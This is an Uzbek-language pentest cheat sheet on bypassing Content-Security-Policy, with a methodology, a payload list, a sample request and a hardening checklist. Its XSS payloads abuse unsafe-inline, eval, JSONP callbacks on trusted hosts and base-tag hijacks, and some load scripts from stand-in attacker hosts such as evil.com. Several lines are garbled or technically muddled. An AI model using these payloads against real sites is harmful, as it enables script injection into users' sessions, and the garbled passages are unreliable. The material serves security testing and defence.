# CSP Bypass

## 1. Ta'rif
CSP (Content-Security-Policy) — XSS oldini oluvchi header. Lekin ko'p konfig zaif: `unsafe-inline`, `unsafe-eval`, wildcard source, `script-src` not set, JSONP endpoints, `base-uri`/`object-src`/`frame-ancestors` esdan chiqqan, nonce reuse.

## 2. Qayerdan kelib chiqadi
- `script-src 'unsafe-inline'` — inline `<script>` ruxsat
- `script-src 'unsafe-eval'` — eval/Function
- `script-src https:` wildcard — barcha *.js + JSONP (CSP bypass via trusted domain)
- `*` / `blob:` / `data:` source
- `default-src` noto'g'ri, script-src yo'q
- `base-uri` yo'q → base tag (script path manipulation)
- `object-src` yo'q → `<object>` data
- Nonce'lar client-boshqariladigan / reuse qilinadi
- `strict-dynamic` without nonce/hash analyses

## 3. Turlari
| Zaiflik | Bypass yo'li |
|---------|--------------|
| unsafe-inline | inline `<script>` / event handler |
| unsafe-eval | `eval`, `Function`, setTimeout string, setInterval |
| `https:` / domain wildcard | JSONP endpoints (angular.callbacks, callback=, jsonp=) |
| `blob:` | blob'da JS? baytmi-whatever |
| base-uri yo'q | `<base href=//attacker>` → relative script hijack |
| object/embed open | `<object data>` XSS |
| form-action yo'q | form CSRF / exfil |
| script-src 'none' + legacy | older browsers |
| Google/known domains | CSP Callback gadgets (`googleapis` JSONP) |

## 4. Metodologiya
1. Headerlarni tekshiring: `curl -I` / Burp. NLP:
   - `Content-Security-Policy: default-src 'self'; script-src 'self' https://target.com;`
2. X-XSS ya'ni bo'lmay, CSP policy qancha zaif.
3. CSP'da bo'sh source, whitelist keng:
   - `unsafe-inline` → oddiy XSS payload
   - `https:` → `https://evil.com/x.js`? no, CSP `https:` — barcha https; shunchaki: `<script src=https://attacker/x.js>`
   - `https://trusted.com` (with JSONP): `<script src=https://trusted.com/api?jsonp=alert(1)>`
4. JSONP search: `?callback=`, `jsonp=`, `angular.callbacks._0` — CSP host'da reflect qiladiganga (jsonp-п-aliases):
   ```
   <script src="https://target.com/search?q=x&callback=alert(1);">
   ```
5. Policy `'strict-dynamic'` — `nonce` lekin script davomi: `<script src="//attacker">` no — strict-dynamic nevarki old script'lar (nonce/whitelist) boshqalarni ishga tushirsa: `<script nonce=x>elementx.appendChild(...)</script>` etc — avilable gadget on page.
6. `base-uri` test: `<base href="//attacker/">` → relative script/src yuklash attacker'ga yonlash.
   ```html
   <base href="//evil.com/"><script src="/x.js"></script>
   ```
7. Old browser (meta CSP) o'xshash.

## 5. Payload'lar
```
# unsafe-inline
<script>alert(1)</script>
<img src=x onerror=alert(1)>

# unsafe-eval
<script>eval("alert(1)")</script>
<script>setTimeout`alert\x281\x29`;</script>

# https: wildcard
<script src="https://attacker.tld/x.js"></script>

# JSONP on trusted domain
<script src="https://trusted.com/api?callback=alert(1);"></script>
<script src="https://cdn.cx/?cb=alert(1)"></script>

# CSPD (strict-dynamic gadget): if page has inline with nonce:
<script nonce="x">document.removeChild(document.head.firstChild)</script>...
```
## 6. PoC / request
```
GET / HTTP/1.1
Host: target.com
# Response header:
# Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.target.com;
# bypass:
# <script src=https://cdn.target.com/api?jsonp=alert(document.domain)></script>
```
## 7. Nimalarga ahamiyat berish (checklist)
- [ ] `unsafe-inline` xor `unsafe-eval`
- [ ] Wildcard source: `https:` `*:`; `script-src https://*.target.com` — bemuhitega domainlar (user content)
- [ ] JSONP - trusted host'da refleks
- [ ] `base-uri`, `object-src`, `frame-ancestors` yo'q (combine XSS)
- [ ] Nonce predictability / reuse
- [ ] `strict-dynamic` — gadget chains
- [ ] `report-uri`/`report-to` — CSP reporting external (info)
- [ ] Angular/Vue DOM — CSP bypass via templates
## 8. Himoya
- `script-src 'nonce-...'`/hash + strict-dynamic, never unsafe-*
- `default-src 'none'`, limit `base-uri`, `object-src 'none'`
- No JSONP on CSP hosts; allowlist exact origins instead of `https:`
- Serve CSP header server-side with correct sources; report-to internal